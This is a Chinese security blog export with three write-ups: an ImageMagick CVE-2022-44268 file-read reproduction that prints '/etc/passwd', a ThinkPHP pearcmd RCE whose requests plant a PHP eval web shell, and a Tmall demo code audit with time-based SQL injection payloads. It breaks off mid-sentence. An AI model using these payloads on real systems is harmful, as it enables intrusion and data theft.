[{"title":"MINI天猫商城代码审计","url":"/2023/02/22/ImageMagick%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20(CVE-2022-44268)/","content":"<h1 id=\"ImageMagick任意文件读取漏洞-CVE-2022-44268\"><a href=\"#ImageMagick任意文件读取漏洞-CVE-2022-44268\" class=\"headerlink\" title=\"ImageMagick任意文件读取漏洞 (CVE-2022-44268)\"></a>ImageMagick任意文件读取漏洞 (CVE-2022-44268)</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><p>ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。</p>\n<h2 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">ImageMagick <span class=\"number\">7.1</span>.x &lt;= <span class=\"number\">7.1</span><span class=\"number\">.0</span>-<span class=\"number\">51</span></span><br><span class=\"line\">ImageMagick <span class=\"number\">7.0</span>.x</span><br><span class=\"line\">ImageMagick <span class=\"number\">6.9</span>.x</span><br><span class=\"line\">ImageMagick <span class=\"number\">6.8</span><span class=\"number\">.3</span>-<span class=\"number\">10</span> &lt;= <span class=\"number\">6.8</span>.x &lt;= <span class=\"number\">6.8</span><span class=\"number\">.9</span>-<span class=\"number\">10</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"环境部署\"><a href=\"#环境部署\" class=\"headerlink\" title=\"环境部署\"></a>环境部署</h2><p><strong>imagemagick及其依赖环境安装：</strong></p>\n<p>我这边是直接在centos里面安装了这个环境的，命令如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum -y install ImageMagick pngcrush exiftool exiv2 -y</span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p><strong>生成恶意图片文件</strong></p>\n<p>可选择任意png文件，使用pngcrush对其进行编辑生成，默认生成文件为pngout.png</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">pngcrush -text a <span class=\"string\">&quot;profile&quot;</span> <span class=\"string\">&quot;/etc/passwd&quot;</span> exp.png</span><br></pre></td></tr></table></figure>\n<p>或者使用脚本</p>\n<p><a href=\"https://codeload.github.com/Sybil-Scan/imagemagick-lfi-poc/zip/refs/heads/main\">https://codeload.github.com/Sybil-Scan/imagemagick-lfi-poc/zip/refs/heads/main</a></p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">python3 generate.py -f &quot;/etc/passwd&quot; -o exploit.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"f-ese1LhLLFdBw0AWb-6gQevjjIFgZ53ahYNuBm1TOg.png\" alt=\"image\"></p>\n<p><strong>验证生成文件</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">exiv2 -pS exp.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"KgELFLLhuDYbM_cg6fs43HuhfrlEQpAgISgDN9JAwO0.png\" alt=\"image\"></p>\n<p><strong>执行convert，调用ImagemMagic对图片进行编辑</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">convert exp.png haha6.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"WcRJPYlNXNNnLRuiCpF-aHgq6jiAzojD1ebbFcAhEIk.png\" alt=\"image\"></p>\n<p><strong>读取生成图片内容</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">identify -verbose haha6.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"Fo-5o5IfS7UrV7zkugPZZw8psf4h0SjVMBw8MqzpzhI.png\" alt=\"image\"></p>\n<p><img src=\"Yu95gJsykkPmi8nbDP6EvI9vQzQJ5y3Ss3MWAaYxgW8.png\" alt=\"image\"></p>\n<p>python解码示例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(bytes.fromhex(text).decode(<span class=\"string\">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(bytes.fromhex(<span class=\"string\">&quot;726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a62696e3a783a313a313a62696e3a2f62696e3a2f7362696e2f6e6f6c6f67696e0a6461656d6f6e3a783a323a323a6461656d6f6e3a2f7362696e3a2f7362696e2f6e6f6c6f67696e0a61646d3a783a333a343a61646d3a2f7661722f61646d3a2f7362696e2f6e6f6c6f67696e0a6c703a783a343a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7362696e2f6e6f6c6f67696e0a73796e633a783a353a303a73796e633a2f7362696e3a2f62696e2f73796e630a73687574646f776e3a783a363a303a73687574646f776e3a2f7362696e3a2f7362696e2f73687574646f776e0a68616c743a783a373a303a68616c743a2f7362696e3a2f7362696e2f68616c740a6d61696c3a783a383a31323a6d61696c3a2f7661722f73706f6f6c2f6d61696c3a2f7362696e2f6e6f6c6f67696e0a6f70657261746f723a783a31313a303a6f70657261746f723a2f726f6f743a2f7362696e2f6e6f6c6f67696e0a67616d65733a783a31323a3130303a67616d65733a2f7573722f67616d65733a2f7362696e2f6e6f6c6f67696e0a6674703a783a31343a35303a46545020557365723a2f7661722f6674703a2f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a39393a39393a4e6f626f64793a2f3a2f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3139323a3139323a73797374656d64204e6574776f726b204d616e6167656d656e743a2f3a2f7362696e2f6e6f6c6f67696e0a646275733a783a38313a38313a53797374656d206d657373616765206275733a2f3a2f7362696e2f6e6f6c6f67696e0a706f6c6b6974643a783a3939393a3939383a5573657220666f7220706f6c6b6974643a2f3a2f7362696e2f6e6f6c6f67696e0a737373643a783a3939383a3939363a5573657220666f7220737373643a2f3a2f7362696e2f6e6f6c6f67696e0a6c696273746f726167656d676d743a783a3939373a3939343a6461656d6f6e206163636f756e7420666f72206c696273746f726167656d676d743a2f7661722f72756e2f6c736d3a2f7362696e2f6e6f6c6f67696e0a7270633a783a33323a33323a52706362696e64204461656d6f6e3a2f7661722f6c69622f72706362696e643a2f7362696e2f6e6f6c6f67696e0a636f6c6f72643a783a3939363a3939333a5573657220666f7220636f6c6f72643a2f7661722f6c69622f636f6c6f72643a2f7362696e2f6e6f6c6f67696e0a676c75737465723a783a3939353a3939323a476c75737465724653206461656d6f6e733a2f7661722f72756e2f676c75737465723a2f7362696e2f6e6f6c6f67696e0a7361736c617574683a783a3939343a37363a5361736c617574686420757365723a2f72756e2f7361736c61757468643a2f7362696e2f6e6f6c6f67696e0a616272743a783a3137333a3137333a3a2f6574632f616272743a2f7362696e2f6e6f6c6f67696e0a736574726f75626c6573686f6f743a783a3939333a3939303a3a2f7661722f6c69622f736574726f75626c6573686f6f743a2f7362696e2f6e6f6c6f67696e0a72746b69743a783a3137323a3137323a5265616c74696d654b69743a2f70726f633a2f7362696e2f6e6f6c6f67696e0a70756c73653a783a3137313a3137313a50756c7365417564696f2053797374656d204461656d6f6e3a2f7661722f72756e2f70756c73653a2f7362696e2f6e6f6c6f67696e0a6368726f6e793a783a3939323a3938373a3a2f7661722f6c69622f6368726f6e793a2f7362696e2f6e6f6c6f67696e0a727063757365723a783a32393a32393a525043205365727669636520557365723a2f7661722f6c69622f6e66733a2f7362696e2f6e6f6c6f67696e0a6e66736e6f626f64793a783a36353533343a36353533343a416e6f6e796d6f7573204e465320557365723a2f7661722f6c69622f6e66733a2f7362696e2f6e6f6c6f67696e0a756e626f756e643a783a3939313a3938363a556e626f756e6420444e53207265736f6c7665723a2f6574632f756e626f756e643a2f7362696e2f6e6f6c6f67696e0a7473733a783a35393a35393a4163636f756e742075736564206279207468652074726f7573657273207061636b61676520746f2073616e64626f78207468652074637364206461656d6f6e3a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a7573626d7578643a783a3131333a3131333a7573626d75786420757365723a2f3a2f7362696e2f6e6f6c6f67696e0a67656f636c75653a783a3939303a3938343a5573657220666f722067656f636c75653a2f7661722f6c69622f67656f636c75653a2f7362696e2f6e6f6c6f67696e0a72616476643a783a37353a37353a726164766420757365723a2f3a2f7362696e2f6e6f6c6f67696e0a71656d753a783a3130373a3130373a71656d7520757365723a2f3a2f7362696e2f6e6f6c6f67696e0a6e74703a783a33383a33383a3a2f6574632f6e74703a2f7362696e2f6e6f6c6f67696e0a67646d3a783a34323a34323a3a2f7661722f6c69622f67646d3a2f7362696e2f6e6f6c6f67696e0a676e6f6d652d696e697469616c2d73657475703a783a3938393a3938333a3a2f72756e2f676e6f6d652d696e697469616c2d73657475702f3a2f7362696e2f6e6f6c6f67696e0a737368643a783a37343a37343a50726976696c6567652d736570617261746564205353483a2f7661722f656d7074792f737368643a2f7362696e2f6e6f6c6f67696e0a61766168693a783a37303a37303a4176616869206d444e532f444e532d534420537461636b3a2f7661722f72756e2f61766168692d6461656d6f6e3a2f7362696e2f6e6f6c6f67696e0a706f73746669783a783a38393a38393a3a2f7661722f73706f6f6c2f706f73746669783a2f7362696e2f6e6f6c6f67696e0a74637064756d703a783a37323a37323a3a2f3a2f7362696e2f6e6f6c6f67696e0a7a68696e616e3a783a313030303a313030303a7a68696e616e3a2f686f6d652f7a68696e616e3a2f62696e2f626173680a73616e65643a783a3938383a3938323a53414e45207363616e6e6572206461656d6f6e20757365723a2f7573722f73686172652f73616e653a2f7362696e2f6e6f6c6f67696e0a&quot;</span>).decode(<span class=\"string\">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>\n<p><img src=\"rI5sRPsJaJJGMz4NZ1bkCQhjmLgjOVMNoYaxIhigNzY.png\" alt=\"image\"></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>参考：<a href=\"https://www.metabaseq.com/imagemagick-zero-days/\">https://www.metabaseq.com/imagemagick-zero-days/</a> </p>\n<p>这里以ImageMagick-7.1.0-50为例</p>\n<p>下载地址：<a href=\"https://github.com/ImageMagick/ImageMagick/releases?page=3\">https://github.com/ImageMagick/ImageMagick/releases?page=3</a></p>\n<p>读取PNG文件</p>\n<p>coders&#x2F;png.c:2164的ReadOnePNGImage</p>\n<p><img src=\"9sBp92IEFRqxjQ8m6OknRJT_vxiawLYajMeB92lCtOk.png\" alt=\"image\"></p>\n<p>读取tEXt的过程当中会调用到SetImageProperty()</p>\n<p><img src=\"vtNgJlbyW1oTVDyugyLC8XNuQUZRVC52HZ9AlOmfqlM.png\" alt=\"image\"></p>\n<p>SetImageProperty()在于MagickCore&#x2F;property.c:4360</p>\n<p><img src=\"Jqu1VvLsz3Vo8ymIDkDsH_T6gGkHTTWS4b0BHPPQ2O0.png\" alt=\"image\"></p>\n<p>在SetImageProperty()中，如果匹配到profile就进行文件读取，再将其重新赋值。（MagickCore&#x2F;property.c:4723）</p>\n<p><img src=\"WpjfH9aNHmJBSrS9LcAD86GXYzFwOqDfqO2QlYslS0o.png\" alt=\"image\"></p>\n<p>读取成功之后就写入到新的png文件中。攻击者下载该图片，即可获取到内容。</p>\n<p>思路整理：</p>\n<ul>\n<li>攻击者向PNG图片添加的文本块中包含profile“关键字”和“文本字符串”</li>\n<li>ImageMagick把文本字符串做为文件路径去读取文件</li>\n<li>文件内容以HEX形式嵌入新生成的PNG图片</li>\n<li>攻击者下载新的PNG图片</li>\n</ul>\n","categories":["漏洞复现"],"tags":["漏洞复现"]},{"title":"ThinkPHP 多语言RCE","url":"/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/","content":"<h1 id=\"Think-PHP-多语言RCE\"><a href=\"#Think-PHP-多语言RCE\" class=\"headerlink\" title=\"Think PHP 多语言RCE\"></a>Think PHP 多语言RCE</h1><h2 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h2><p>本次漏洞影响范围如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">v6.0.1 &lt; Thinkphp &lt; v6.0.13 </span><br><span class=\"line\">Thinkphp v5.0.x </span><br><span class=\"line\">Thinkphp v5.1.x</span><br></pre></td></tr></table></figure>\n\n\n<p>FOFA 语法：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">header=<span class=\"string\">&quot;think_lang&quot;</span></span><br></pre></td></tr></table></figure>\n<p>要求：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">1、需要Thinkphp开启多语言功能</span><br><span class=\"line\">2、需要有pearcmd扩展</span><br></pre></td></tr></table></figure>\n<p>复现环境：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -d -p 8080:80  vulfocus/thinkphp:6.0.12</span><br><span class=\"line\">访问8080</span><br></pre></td></tr></table></figure>\n<h2 id=\"getshell\"><a href=\"#getshell\" class=\"headerlink\" title=\"getshell\"></a>getshell</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /<span class=\"keyword\">public</span>/index.php?+config-create+/&lt;?=<span class=\"meta\">@eval($_REQUEST[&#x27;w&#x27;])</span>;?&gt;+/tmp/nihao2.php HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">192.168</span><span class=\"number\">.134</span><span class=\"number\">.154</span>:<span class=\"number\">8066</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">9.0</span> (Macintosh; M2 Mac OS X <span class=\"number\">16.12</span>; rv:<span class=\"number\">129.0</span>) Gecko/<span class=\"number\">20230101</span> Firefox/<span class=\"number\">169.0</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,*<span class=\"comment\">/*;q=0.8</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">think-lang:../../../../../../../../usr/local/lib/php/pearcmd</span></span><br><span class=\"line\"><span class=\"comment\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: think_lang=zh-cn</span></span><br><span class=\"line\"><span class=\"comment\">Upgrade-Insecure-Requests: 1</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br></pre></td></tr></table></figure>\n<p><img src=\"NCwfWVvRgWz82eLRr8l1N7EHtG7Khg_2feCTjwY4uOY.png\" alt=\"image\"></p>\n<h2 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /<span class=\"keyword\">public</span>/index.php HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">192.168</span><span class=\"number\">.134</span><span class=\"number\">.154</span>:<span class=\"number\">8066</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">9.0</span> (Macintosh; M2 Mac OS X <span class=\"number\">16.12</span>; rv:<span class=\"number\">129.0</span>) Gecko/<span class=\"number\">20230101</span> Firefox/<span class=\"number\">169.0</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,*<span class=\"comment\">/*;q=0.8</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">think-lang:../../../../../../../../tmp/nihao2</span></span><br><span class=\"line\"><span class=\"comment\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: think_lang=zh-cn</span></span><br><span class=\"line\"><span class=\"comment\">Upgrade-Insecure-Requests: 1</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 12</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">w=phpinfo();</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"GLWHx5a3SsGhTvmxKP5FEPt2BFMzg-DHNtC22UxI2Jg.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","Thinkphp","RCE"]},{"title":"MINI天猫商城代码审计","url":"/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"<h1 id=\"MINI天猫商城代码审计\"><a href=\"#MINI天猫商城代码审计\" class=\"headerlink\" title=\"MINI天猫商城代码审计\"></a>MINI天猫商城代码审计</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>最近看到很多师傅们，都在做这套tmall系统的代码审计，一时起兴趣，就自己也下载下来进行审一审，全程按照自己的思路去审计分析。在此进行简单的记录。</p>\n<h2 id=\"环境搭建与配置\"><a href=\"#环境搭建与配置\" class=\"headerlink\" title=\"环境搭建与配置\"></a>环境搭建与配置</h2><p>项目地址：<a href=\"https://gitee.com/project_team/Tmall_demo\">https://gitee.com/project_team/Tmall_demo</a></p>\n<p>配置文件：src&#x2F;main&#x2F;resources&#x2F;application.properties</p>\n<p>修改为自己的数据库地址，也可以修改启动的端口</p>\n<p><img src=\"A9LKEZadvuLcO8WshiS5_zZu2oQ5uFuwZsIsiBWKutQ.png\" alt=\"image\"></p>\n<p>启动文件：src&#x2F;main&#x2F;java&#x2F;com&#x2F;xq&#x2F;tmall&#x2F;TmallSpringBootApplication.java</p>\n<p>待maven加载完依赖之后，在该文件中进行启动项目。</p>\n<p><img src=\"S4qCXllB0lfY-EYB3VvMopRriHMWrvpgNwjnyxFt2mc.png\" alt=\"image\"></p>\n<p>浏览器访问</p>\n<p><img src=\"sGMZu6i0o4YbnEjwZ8WkzHfvhfnCdM1tu9erfY531HU.png\" alt=\"image\"></p>\n<p>当我进行一些功能的操作的时候，发现报错了。</p>\n<p><img src=\"bRwiZdkeSDU9jSMzbGy8q2itpZdBxABxpjripwgAKA0.png\"></p>\n<p>从下面这篇文章找到了解决方法，大概的意思就是我mysql版本较低，有个sql_mode默认没有开启，需要手动开启一下。</p>\n<p><a href=\"https://www.cnblogs.com/hungryquiter/p/16995127.html\">https://www.cnblogs.com/hungryquiter/p/16995127.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">SET @@global.sql_mode =<span class=\"string\">&#x27;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>上述配置是临时开启该模式，重mysql之后会消失。</p>\n<h2 id=\"审计硬编码和使用的供应链\"><a href=\"#审计硬编码和使用的供应链\" class=\"headerlink\" title=\"审计硬编码和使用的供应链\"></a>审计硬编码和使用的供应链</h2><h3 id=\"硬编码\"><a href=\"#硬编码\" class=\"headerlink\" title=\"硬编码\"></a>硬编码</h3><p>直接ctrl+shif+f 全局搜索password 、pass、jdbc等关键字。</p>\n<p>搜索password</p>\n<p><img src=\"dW055RlSMosFZVq3Bsle4y6ZgLBaFc76sWTt31hvpTo.png\" alt=\"image\"></p>\n<p>搜索jdbc</p>\n<p><img src=\"G0pAhAER4GW7XH0vPkzaFeSJI_ejyw3q2_n5f_LUFZk.png\" alt=\"image\"></p>\n<p>上述可看到一些硬编码</p>\n<h3 id=\"供应链安全\"><a href=\"#供应链安全\" class=\"headerlink\" title=\"供应链安全\"></a>供应链安全</h3><p>本项目是使用maven管理，所以直接查看pom.xml文件，分析用了那些依赖以及版本。再去判断是否存在漏洞。</p>\n<p><img src=\"JaLhHxRPGH2PkAW5npc8PT2CFajmXD_vOXIlKuX9oA4.png\" alt=\"image\"></p>\n<p>分析到了druid、fastjson、log4j、springframework.boot等一些比较常见的存在漏洞的组件或框架。</p>\n<p>先对其有大致的了解，后续再深入研究。</p>\n<h2 id=\"审计owaspTop10漏洞\"><a href=\"#审计owaspTop10漏洞\" class=\"headerlink\" title=\"审计owaspTop10漏洞\"></a>审计owaspTop10漏洞</h2><h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><h4 id=\"SQL注入一（后台）\"><a href=\"#SQL注入一（后台）\" class=\"headerlink\" title=\"SQL注入一（后台）\"></a>SQL注入一（后台）</h4><p>分析了一下该项目，发现mybatis的xml文件均存放在&#x2F;Users&#x2F;garck&#x2F;D&#x2F;code&#x2F;java&#x2F;CodeAudit&#x2F;Tmall_demo-master&#x2F;src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper中。</p>\n<p>下面直接搜索这个文件夹下面的带有 “$” 符号的xml文件来进行详细分析。</p>\n<p><img src=\"R5LFjOKJYSV8ZYNvgY1wBB_a6LHJZ6c2R6c3TlBlk0k.png\" alt=\"image\"></p>\n<p><img src=\"RCVvashWJlQe0ZBbzd4B2s9jZJJLnStqrCCiUbiIV7E.png\" alt=\"image\"></p>\n<p>SQL语句使用了“$” 符号，就是使用了拼接的方式进行执行。若能够控制传入的数据，且没有过滤的情况下，可构造payload进行SQL注入。</p>\n<p>下面开始分析 ProductMapper.xml的“${orderUtil.orderBy}”</p>\n<p><img src=\"g58fPkSb12qkbpG9ZTuazo7yl6doXP36ghUfyljL-Aw.png\" alt=\"image\"></p>\n<p>这是一个查询的SQL语句，并且绑定的是select方法，且是属于接⼝com.xq.tmall.dao.ProductMapper的select方法</p>\n<p><img src=\"faR5oAEY5Gu4y1nT1lH9i-JchVHFuBXXuaYyVNm_wNg.png\" alt=\"image\"></p>\n<p>查看该接口，确认存在select方法，且传入了OrderUtil参数</p>\n<p><img src=\"v5616V98pJYf5lR7b-YXr6JcdwNlf4ApqPEcvhYJBe8.png\" alt=\"image\"></p>\n<p>搜索哪个地方调用了这个接口的方法，发现接口实现类ProductServiceImpl中有调用</p>\n<p><img src=\"CJxsIYmAAtLCiNN58-KsMWlhFQYo3IqUOnBUB1HmDGg.png\" alt=\"image\"></p>\n<p>详情</p>\n<p><img src=\"rQ7D9Wcxk6KTbyuhV03hB8WEBYn-xiHUaH4VXWKD1ZE.png\" alt=\"image\"></p>\n<p>ProductService接口类声明的getList，同时传入的orderUtil</p>\n<p><img src=\"PL7q_4fg5FkMFSnz0LHEA8P10jchuNaB14b6ztmWZDM.png\" alt=\"image\"></p>\n<p>看一下orderUtil工具类</p>\n<p><img src=\"4p_n__dpbG5-Tm7F0E1TcTASSkO6PZKBlh1J-olguRM.png\" alt=\"image\"></p>\n<p>搜索哪个controller类中调用了ProductServiceImpl的getList方法，分析一下ForeProductListController168行</p>\n<p><img src=\"R2SbHwlsZsvVw9hhQD1DomChJ51ER_vTUORis7RK5VM.png\" alt=\"image\"></p>\n<p>看了一下这个注释，大概是在 获取商品列表的时候需要调用ProductService.getList。</p>\n<p>还原一下接口URL；确认是GET请求，根路径是product</p>\n<p><img src=\"L_yJC--fe4KS-0Z0R-Ch-vWP-WJQbIZk29h32GCqOXc.png\" alt=\"image\"></p>\n<p>产品高级查询功能；product&#x2F;{index}&#x2F;{count}，看到这里之后，凉凉了，orderUtil不可控。</p>\n<p><img src=\"K4bGIFH65ZSsmckU05MWP8pyWLBxZYAROhKtsDui5yY.png\" alt=\"image\"></p>\n<p>继续找其他调用ProductService.getList的controller类；看一下ProductController类的49行，发现传入的orderUtil为null，直接跳过分析下一个。</p>\n<p><img src=\"NVpD-Nmps9gm3dqPPBGNT-EHJzN7khr0mQ2mea3jrso.png\" alt=\"image\"></p>\n<p>ProductController类的405行，</p>\n<p><img src=\"8dSTKLl4xUWOBIxmVFrKBta2_M9J4d1cL_9qVEk74Z4.png\" alt=\"image\"></p>\n<p>结合OrderUtil的构造方法分析，看看有没有传入orderBy和isDesc这两个参数</p>\n<p><img src=\"_Mzz8zN1vCnyvwngr31N2h-BNbSrmavfTDLX6SrM4v8.png\" alt=\"image\"></p>\n<p>发现参数可控，前端传入orderBy参数到该控制层</p>\n<p><img src=\"13tqRPx3xqZQ83kZtkKTg8HwJbZuCoZ0ognokbRLfR0.png\" alt=\"image\"></p>\n<p>构造payload</p>\n<p>admin&#x2F;product&#x2F;{index}&#x2F;{count}，加上一个统一的前缀&#x2F;tmall后继续访问；&#x2F;tmall&#x2F;admin&#x2F;product&#x2F;</p>\n<p><img src=\"0QG6nM0OaDbiCoTGabMMDLDR5yZTemvwc39QKJw_my0.png\" alt=\"image\"></p>\n<p>登录后台。账号：admin.  密码：123456</p>\n<p>因为这里使用了rest风格的URL，理论上说index和count可以随意输入，所以直接构造到的URL为：<a href=\"http://192.168.75.154:8090/tmall/admin/product/1/1?orderBy=1\">http://192.168.75.154:8090/tmall/admin/product/1/1?orderBy=1</a></p>\n<p>注入参数：orderBy</p>\n<p><img src=\"yRIojR8Gm6UI9QON7BC6ZOsalU5du_SjjFsjTqekvmQ.png\" alt=\"image\"></p>\n<p>添加单引号</p>\n<p><img src=\"Nc-FAUCqKvTesqsgAKPDDccRwg-r31LOVF1JA97e260.png\" alt=\"image\"></p>\n<p>延迟5秒</p>\n<p><img src=\"0RPN1gIO7NsY1qs-Y_82bUvR7OLW9PeEhLgawGI_GqE.png\" alt=\"image\"></p>\n<p>sqlmap验证</p>\n<p><img src=\"H5GbOwzVOfd8htyOuM0quyHPGutc1U7XEXMla1pMh4Q.png\" alt=\"image\"></p>\n<p>看了一下过滤器，只做了权限校验。没有做SQL注入的过滤，所以只要发现参数可控的注入的即可注入，不需要绕过。</p>\n<p><img src=\"6QPlX1nJtLPMGa_rnxqVz10dQfyz9wlyxK3TcNhujQM.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入二（前台）\"><a href=\"#SQL注入二（前台）\" class=\"headerlink\" title=\"SQL注入二（前台）\"></a>SQL注入二（前台）</h4><p>继续寻找调用了ProductServiceImpl的getList方法的controller</p>\n<p>ProductService.getList</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">----  ForeHomeController    ###调用ProductService.getList时传入为null，不存在注入</span><br><span class=\"line\">---+  ProductController     ###后台注入</span><br><span class=\"line\">---+  ForeProductListController   ###前台注入</span><br><span class=\"line\">----  ForeProductDetailsController   ###调用ProductService.getList时传入为null，不存在注入</span><br></pre></td></tr></table></figure>\n<p>ForeProductListController的168行传入了orderUtil对象。</p>\n<p><img src=\"1idGrN6XrKL7LK1kDGa1e8j9NGwt2bwwfbkfr500KFM.png\" alt=\"image\"></p>\n<p>分析orderUtil对象的来源。</p>\n<p><img src=\"l6vzVsRfFF5iXLSZGVP_TxXkOWn1tE1votXCQEIebIs.png\" alt=\"image\"></p>\n<p><img src=\"qpm6TF2VikRSreOzScimwNyJBBjwhx6dqqMfmwiJOkg.png\" alt=\"image\"></p>\n<p>进行构造payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.75.154:8090/tmall/product/0/20?orderBy=1 AND (SELECT 3188 FROM (SELECT(SLEEP(5)))KJQA)</span><br></pre></td></tr></table></figure>\n<p><img src=\"9Z0qgqtR-ynJluX--BI9mg6X_Xq3e8F023Hw3zVtdS4.png\" alt=\"image\"></p>\n<p>成功延迟</p>\n<p><img src=\"aZEjn49GvzMTUfxi6MaanU3wnUu1iI9P2fG6S-XtAko.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入三（前台）\"><a href=\"#SQL注入三（前台）\" class=\"headerlink\" title=\"SQL注入三（前台）\"></a>SQL注入三（前台）</h4><p>分析到了利用链：ProductMapper.selectMoreList—ProductService.getMoreList—ForeProductListController(163)。</p>\n<p>需要满足条件：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">product_name_split不为空</span><br><span class=\"line\">product_name_split.length长度大于1</span><br></pre></td></tr></table></figure>\n<p><img src=\"b7sJTjIfFVd9cOZv38BpuIYAGEIhcENftkJ7TPbklE8.png\" alt=\"image\"></p>\n<p>溯product_name_split的由来</p>\n<p><img src=\"Pfdv1cTF2FZo2Ke7tId-E9i0c62MyJSvfNtVxpAMOhE.png\" alt=\"image\"></p>\n<p>product_name_split &#x3D; product_name.split(“ “);</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">product_name 不为空</span><br></pre></td></tr></table></figure>\n<p>分析得知：product_name_split 